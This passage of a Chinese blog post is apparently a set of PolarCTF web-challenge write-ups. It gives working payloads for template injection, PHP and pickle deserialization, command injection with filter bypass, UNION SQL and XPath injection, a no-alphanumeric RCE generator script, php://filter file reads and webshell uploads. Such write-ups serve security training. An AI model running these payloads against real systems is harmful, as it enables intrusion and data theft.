方法通过其第一个参数载入模板，并通过第二个参数中的变量来渲染模板。</p><p>使用 Twig 模版引擎渲染页面，其中模版含有  变量，其模版变量值来自于GET请求参数$_GET[“name”] 。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">魔术方法</span><br><span class="line">__class__   ：返回类型所属的对象</span><br><span class="line">__mro__     ：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   ：返回该对象所继承的父类</span><br><span class="line">__mro__     ：返回该对象的所有父类</span><br><span class="line"></span><br><span class="line">__subclasses__()  获取当前类的所有子类</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含(保存)函数全局变量的字典的引用</span><br></pre></td></tr></table></figure><p>构造payload<code>&#123;&#123;lipsum.__globals__.__builtins__.__import__('os').popen('cat /f*').read()&#125;&#125;</code>得到flag</p><h3 id="PlayGame"><a href="#PlayGame" class="headerlink" title="PlayGame"></a>PlayGame</h3><p>首先分析源码，pop链是<code>PlayGame.__destruct -&gt; User.__toString -&gt; PlayGame.__toString -&gt; PlayGame.openGame()</code></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-27 21.14.22.png" alt="截屏2025-02-27 21.14.22" style="zoom:50%;" /></p><ul><li>1、反序列化链的入口在魔法函数 <strong>destruct() ，调用对象后会立即触发 </strong>destruct() 函数输出$this-&gt;user-&gt;name.”GameOver!”。</li><li>2、 $this-&gt;user-&gt;name、$gameFile 两个参数可控，出口在 __toString() 函数，只有对象转换为字符时才会被调用，才会进入 openGame() 函数执行 file_get_contents($this-&gt;gameFile) ，去包含想要的文件。</li><li>3、flag文件路径未知，要怎么获取？</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exp</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PlayGame</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$gameFile</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">PlayGame</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">PlayGame</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;name=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;user=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;gameFile=<span class="string">&quot;/flag&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">O:<span class="number">8</span>:<span class="string">&quot;PlayGame&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;O:<span class="number">8</span>:<span class="string">&quot;PlayGame&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;N;s:<span class="number">8</span>:<span class="string">&quot;gameFile&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;/flag&quot;</span>;&#125;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;N;s:<span class="number">3</span>:<span class="string">&quot;sex&quot;</span>;N;&#125;s:<span class="number">8</span>:<span class="string">&quot;gameFile&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><p>构造payload<code>?polar[flag.flag=O:8:&quot;PlayGame&quot;:2:&#123;s:4:&quot;user&quot;;O:4:&quot;User&quot;:3:&#123;s:4:&quot;name&quot;;O:8:&quot;PlayGame&quot;:2:&#123;s:4:&quot;user&quot;;N;s:8:&quot;gameFile&quot;;s:5:&quot;/flag&quot;;&#125;s:3:&quot;age&quot;;N;s:3:&quot;sex&quot;;N;&#125;s:8:&quot;gameFile&quot;;N;&#125;</code>得到flag</p><h3 id="phpurl"><a href="#phpurl" class="headerlink" title="phpurl"></a>phpurl</h3><p>先把提示的内容<code>`aW5kZXgucGhwcw</code>用base64进行解码，得到<code>index.phps</code>,然后访问<code>index.phps</code></p><p>得到源码，进行分析，发现GET方法传入一个sys参数，然后用urlecode()进行加密了后面又判断了sys与xxs是否相等，那么看看经过多次url编码是否能获得flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 14.12.47.png" alt="截屏2025-02-28 14.12.47" style="zoom:50%;" /></p><p>构造payload<code>?sys=%25%37%38%25%37%38%25%37%33</code>,发现获得了flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 14.14.41.png" alt="截屏2025-02-28 14.14.41" style="zoom:25%;" /></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 14.15.00.png" alt="截屏2025-02-28 14.15.00" style="zoom:25%;" /></p><h3 id="再来ping一波啊"><a href="#再来ping一波啊" class="headerlink" title="再来ping一波啊"></a>再来ping一波啊</h3><p>首先是一个输入框，看题目的描述，试一下<code>127.0.0.1;id</code>发现可以返回，但是<code>tac</code>不可以执行,应该是过滤了，但是又不知道flag在哪，查看一下<code>t\ac%09index.php</code>发现返回了”那能让你直接读？”,那么就先读取index.php查看一下源码吧，构造一下payload <code>?ip=127.0.0.1;a=ind;b=ex;ta\c%09$a$b.php</code>访问网站看一下源码发现了flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 14.31.48.png" alt="截屏2025-02-28 14.31.48" style="zoom:25%;" /></p><h3 id="search"><a href="#search" class="headerlink" title="search"></a>search</h3><p>首先是一个输入框，一眼sql注入啊，发现是一个POST的参数，那么直接测试</p><p>本题过滤了空格，那么直接/**/替换一下</p><p>sql注入步骤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 首先是判断有几个字段：&#x27;order by 1#</span><br><span class="line">2. 判断完之后直接用语句看看哪一个字段执行了返回了数据: &#x27;Union/**/Select/**/1,2,3,4,5#</span><br><span class="line">3. 直接查看数据库：&#x27;Union/**/Select/**/1,database(),3,4,5#</span><br><span class="line">4. 查看表名具体要分析一下：group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; --+ </span><br><span class="line">5. 查看列名：group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; --+</span><br><span class="line">6.查看字段值：group_concat(id,username,password) from users --+</span><br></pre></td></tr></table></figure><p>查看表名<code>query=&#39;/**/Union/**/Select/**/1,group_concat(table_name),3,4,5/**/From/**/information_schema.tables/**/whEre/**/table_schema=database()/**/#</code></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 15.22.28.png" alt="截屏2025-02-28 15.22.28" style="zoom:25%;" /></p><p>查看列名<code>query=1&#39;/**/Union/**/Select/**/1,group_concat(column_name),3,4,5/**/From/**/information_schema.columns/**/whEre/**/table_schema=database()/**/and/**/table_name=&#39;Flag&#39;/**/#</code></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 15.22.04.png" alt="截屏2025-02-28 15.22.04" style="zoom:25%;" /></p><p>查看字段值<code>query=&#39;/**/Union/**/Select/**/1,group_concat(Flag),3,4,5/**/fRom/**/Flag/**/#</code></p><p>得到flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 15.21.07.png" alt="截屏2025-02-28 15.21.07" style="zoom:50%;" /></p><h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><p>首先判断了一下sql注入发现不是，考虑一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Xpath注入利用Xpath解析器的松散输入和容错 i 特性，能够在URL、表单或其他信息上附带恶意的</span><br><span class="line">XPath查询代码，以获得高权限的访问权</span><br><span class="line"> Xpath注入类似于SQL注入，当网站实验未经正确处理的用户输入查询XML数据时，可能发生XPATH注入，</span><br><span class="line">由于Xpath种不像sql种有权限的概念，用户可通过提交恶意XPATH代码获得完整的xml文档权限。</span><br></pre></td></tr></table></figure><ul><li>payload：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;]|//*|//*[&#x27;</span><br><span class="line">&#x27;]|//*|ss[&#x27;</span><br><span class="line">&#x27;]|//*|//*[&#x27;</span><br><span class="line">&#x27;]|//*|*[&#x27;</span><br></pre></td></tr></table></figure><h3 id="csdn"><a href="#csdn" class="headerlink" title="csdn"></a>csdn</h3><p>访问URL直接查看源码发现，直接构造payload<code>?xxs=file:///flag.txt</code>得到flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 16.39.46.png" alt="截屏2025-02-28 16.39.46" style="zoom:50%;" /></p><h3 id="unpickle"><a href="#unpickle" class="headerlink" title="unpickle"></a>unpickle</h3><p>查看附件发现是一个pickle反序列化，但是从cookie处打入的</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        user = base64.b64decode(request.cookies.get(<span class="string">&#x27;user&#x27;</span>))</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        <span class="keyword">return</span> user</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        username = <span class="string">&quot;Guest&quot;</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello %s&quot;</span> % username</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><p>构造payload得到flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line"> </span><br><span class="line">class exp(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return eval , (&quot;open(&#x27;/flag&#x27;,&#x27;r&#x27;).read()&quot;, )</span><br><span class="line"> </span><br><span class="line">e=exp()</span><br><span class="line">exp = pickle.dumps(e)</span><br><span class="line">user_b64 = base64.b64encode(exp).decode()</span><br><span class="line">print(user_b64)</span><br></pre></td></tr></table></figure><h3 id="wu"><a href="#wu" class="headerlink" title="wu"></a>wu</h3><p>分析源码，发现是无数字字母RCE，最简单的思路直接取反 </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>下边是一个脚本，建议用这个y4👴的一站式脚本</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Y4tacker</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-11-21 20:31:22</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//或</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">orRce</span>(<span class="params"><span class="variable">$par1</span>, <span class="variable">$par2</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = (<span class="title function_ invoke__">urldecode</span>(<span class="variable">$par1</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$par2</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//异或</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xorRce</span>(<span class="params"><span class="variable">$par1</span>, <span class="variable">$par2</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = (<span class="title function_ invoke__">urldecode</span>(<span class="variable">$par1</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$par2</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//取反</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">negateRce</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN));</span><br><span class="line"> </span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN));</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//mode=1代表或，2代表异或，3代表取反</span></span><br><span class="line"><span class="comment">//取反的话，就没必要生成字符去跑了，因为本来就是不可见字符，直接绕过正则表达式</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate</span>(<span class="params"><span class="variable">$mode</span>, <span class="variable">$preg</span>=<span class="string">&quot;/[A-Za-z0-9_\%\\|\~\&#x27;\,\.\:\@\&amp;\*\+\- ]+/&quot;</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$mode</span>!=<span class="number">3</span>)&#123;</span><br><span class="line">        <span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">        <span class="variable">$contents</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">256</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="number">256</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">                    <span class="variable">$hex_i</span> = <span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$hex_i</span> = <span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">                    <span class="variable">$hex_j</span> = <span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$hex_j</span> = <span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$par1</span> = <span class="string">&quot;%&quot;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">                    <span class="variable">$par2</span> = <span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">                    <span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$mode</span>==<span class="number">1</span>)&#123;</span><br><span class="line">                        <span class="variable">$res</span> = <span class="title function_ invoke__">orRce</span>(<span class="variable">$par1</span>, <span class="variable">$par2</span>);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$mode</span>==<span class="number">2</span>)&#123;</span><br><span class="line">                        <span class="variable">$res</span> = <span class="title function_ invoke__">xorRce</span>(<span class="variable">$par1</span>, <span class="variable">$par2</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"> </span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$res</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$res</span>)&lt;=<span class="number">126</span>)&#123;</span><br><span class="line">                        <span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$res</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$par1</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$par2</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">negateRce</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">generate</span>(<span class="number">3</span>,<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>);</span><br><span class="line"><span class="comment">//1代表模式，后面的是过滤规则</span></span><br><span class="line">直接终端执行脚本</span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.03.47.png" alt="截屏2025-02-28 17.03.47"></p><p>得到flag了</p><h3 id="代码审计1"><a href="#代码审计1" class="headerlink" title="代码审计1"></a>代码审计1</h3><p>分析源码,从代码<code>echo new $sys($xsx);</code> 看考查的是对PHP原生类的利用，题目中做了关键字过滤，可尝试使用PHP伪协议结合PHP原生类（SplFileObject）读取文件进行绕过，这里用的是 base64 编码读取</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 题目</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">$sys = $_GET[&#x27;sys&#x27;];</span><br><span class="line">if (preg_match(&quot;|flag|&quot;, $xsx)) &#123;</span><br><span class="line">           die(&quot;flag is no here!&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $xsx = $_GET[&#x27;xsx&#x27;];</span><br><span class="line">    echo new $sys($xsx);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造payload<code>?sys=SplFileObject&amp;xsx=php://filter/read=convert.base64-encode/resource=flag.php</code>得到base64进行解码得到flag</p><h3 id="你的马呢？"><a href="#你的马呢？" class="headerlink" title="你的马呢？"></a>你的马呢？</h3><p>这个题目肯定是一个上传漏洞，经过多次上传发现对文件内容和后缀进行了检测，那么将一句话木马的php换成=就可以绕过了</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.14.51.png" alt="截屏2025-02-28 17.14.51" style="zoom:50%;" /></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.15.54.png" alt="截屏2025-02-28 17.15.54" style="zoom:50%;" /></p><p> <img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.15.30.png" alt="截屏2025-02-28 17.15.30" style="zoom:50%;" /></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.15.08.png" alt="截屏2025-02-28 17.15.08" style="zoom:50%;" /></p><p>成功上传后，用蚁剑连接<code>/index.php?file=uploads/hack.jpg</code>得到flag</p><h3 id="随机值"><a href="#随机值" class="headerlink" title="随机值"></a>随机值</h3><p>分析源码，发现是反序列化的随机数,按照反序列化的步骤进行构造payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Polar1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Polar2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Night</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Light</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"><span class="variable">$flag</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$Polar2</span> = <span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">100</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;Polar1 === <span class="variable language_">$this</span>-&gt;Polar2)&#123;</span><br><span class="line">            <span class="variable">$Light</span> = <span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">100</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;Night === <span class="variable language_">$this</span>-&gt;Light)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Your wrong!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>]);</span><br><span class="line">    <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getflag</span>(<span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造payload,得到flag</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Polar1</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Polar2</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Night</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Light</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Index</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">//payload:?sys=O%3A5%3A%22Index%22%3A4%3A%7Bs%3A13%3A%22%00Index%00Polar1%22%3Bi%3A1%3Bs%3A13%3A%22%00Index%00Polar2%22%3Bi%3A1%3Bs%3A8%3A%22%00%2A%00Night%22%3Bs%3A1%3A%22a%22%3Bs%3A8%3A%22%00%2A%00Light%22%3Bs%3A1%3A%22a%22%3B%7D</span></span><br></pre></td></tr></table></figure><h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><p>先根据访问URL后的提示查看robots.txt下有什么东西，发现有file和upload，那么肯定是先上传木马然后读取木马，用蚁剑连接</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.35.19.png" alt="截屏2025-02-28 17.35.19" style="zoom:50%;" /></p><p>访问/file</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.35.46.png" alt="截屏2025-02-28 17.35.46" style="zoom:50%;" /></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.35.54.png" alt="截屏2025-02-28 17.35.54" style="zoom:50%;" /></p><p>返回去访问upload</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.36.22.png" alt="截屏2025-02-28 17.36.22" style="zoom:50%;" /></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.36.33.png" alt="截屏2025-02-28 17.36.33" style="zoom:50%;" /></p><p>经过上传测试只能上传图片，那就传个图片马，上传后用file访问一下得到文件路径<code>../uploads/images/hack.jpg</code>,用蚁剑连接</p><p><code>http://5843cbd8-e32c-463b-8a13-7dfb65a381dc.www.polarctf.com:8090/file/file.php?filename=../uploads/images/hack.jpg</code></p><p>得到flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.40.21.png" alt="截屏2025-02-28 17.40.21" style="zoom:50%;" /></p><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><p>根据提示，用dirsearch进行扫描，然后发现点我开始不能点，直接修改代码去掉<code>disabled=&quot;disabled&quot;</code>就可以跳转到上传页面，这个上传没有进行过滤直接上传就行</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.46.23.png" alt="截屏2025-02-28 17.46.23" style="zoom:50%;" /></p><p>扫描完发现上传的路径直接用蚁剑连接得到flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.47.37.png" alt="截屏2025-02-28 17.47.37" style="zoom:50%;" /></p><h3 id="tnl"><a href="#tnl" class="headerlink" title="tnl"></a>tnl</h3><p>经过多次测试注入，发现不是注入，那么猜测一下是不是伪协议</p><p><code>twothree=php://filter/convert.base64-encode/index/resource=index</code></p><p>然后解密base64得到源码，发现自动添加.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;twothree&quot;</span>&gt;Please input your ID:&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> id=<span class="string">&quot;twothree&quot;</span> name=<span class="string">&quot;twothree&quot;</span> required&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ 